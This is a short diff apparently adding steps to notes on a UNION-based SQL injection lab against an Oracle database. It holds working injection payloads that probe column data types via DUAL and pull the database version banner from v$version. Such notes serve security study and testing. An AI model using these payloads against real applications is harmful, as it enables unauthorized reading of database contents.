@@ -13,4 +13,8 @@ Analysis:
 
 (2) Determine the data types of the columns 
 
-' UNION SELECT '
+' UNION SELECT 'a', 'a' from DUAL--
+
+(3) output the database version
+
+' UNION SELECT banner, NULL from v$version-- 
